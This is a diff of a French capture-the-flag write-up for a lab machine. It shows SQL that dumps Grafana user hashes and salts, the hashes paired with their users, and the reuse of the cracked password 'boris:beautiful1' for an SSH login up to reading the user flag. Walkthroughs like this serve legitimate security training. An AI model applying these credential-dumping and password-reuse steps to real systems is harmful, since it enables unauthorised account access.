@@ -573,13 +573,22 @@ sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIH
 
 Afin de conserver une correspondance explicite entre chaque hash et son utilisateur, extraits séparément les logins depuis la table `user`, puis associe-les aux hashes convertis dans le même ordre.
 
-```
+```bash
 sqlite3 -noheader -separator '|' grafana.db \
 "select login, password, salt from user order by id;" > users_pw_salt.txt
 paste -d' ' \
   <(cut -d'|' -f1 users_pw_salt.txt | sed 's/^/# user: /') \
   hashcat_hashes.txt \
 > hashes_with_users.txt
+```
+
+Contrôle du format obtenu :
+
+```bash
+cat hashes_with_users.txt 
+# user: admin sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
+# user: boris sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
+
 ```
 
 Ce fichier te permettra de visualiser directement quel hash correspond à quel compte Grafana, sans interférer avec l’exécution de hashcat.
@@ -687,7 +696,76 @@ cat hashes_with_users.txt
 
 ------
 
-### connexion SSH
+### Connexion SSH
+
+Tu peux réutiliser les identifiants **`boris:beautiful1`** pour tenter une **connexion SSH**, une situation **fréquente en CTF** où les mots de passe sont souvent partagés entre l’application web et le système.
+
+```bash
+ssh boris@data.htb
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+boris@data.htb's password: 
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Tue Jan 27 08:46:04 UTC 2026
+
+  System load:  0.0               Processes:              208
+  Usage of /:   38.0% of 4.78GB   Users logged in:        0
+  Memory usage: 14%               IP address for eth0:    10.129.234.47
+  Swap usage:   0%                IP address for docker0: 172.17.0.1
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+122 additional security updates can be applied with ESM Infra.
+Learn more about enabling ESM Infra service for Ubuntu 18.04 at
+https://ubuntu.com/18-04
+
+
+Last login: Wed Jun  4 13:37:31 2025 from 10.10.14.62
+boris@data:~$ 
+```
+
+Une fois connecté en SSH, tu commences par vérifier ton contexte avec les commandes classiques :
+
+```bash
+whoami
+boris
+id
+uid=1001(boris) gid=1001(boris) groups=1001(boris)
+```
+
+Tu poursuis ensuite par un listing du répertoire courant afin d’identifier rapidement l’environnement et les fichiers accessibles :
+
+```bash
+ls -la
+total 36
+drwxr-xr-x 5 boris boris 4096 Jun  4  2025 .
+drwxr-xr-x 3 root  root  4096 Jun  4  2025 ..
+lrwxrwxrwx 1 boris boris    9 Jan 23  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 boris boris  220 Jan 23  2022 .bash_logout
+-rw-r--r-- 1 boris boris 3771 Jan 23  2022 .bashrc
+drwx------ 2 boris boris 4096 Jan 23  2022 .cache
+drwx------ 3 boris boris 4096 Jan 23  2022 .gnupg
+drwxrwxr-x 3 boris boris 4096 Jan 23  2022 .local
+-rw-r--r-- 1 boris boris  807 Jan 23  2022 .profile
+-rw-r----- 1 boris boris   33 Jan 27 08:33 user.txt
+boris@data:~$
+```
+
+### user.txt
+
+```bash
+cat user.txt
+ad3cxxxxxxxxxxxxxxxxxxxxxxxx0613
+```
 
 
 
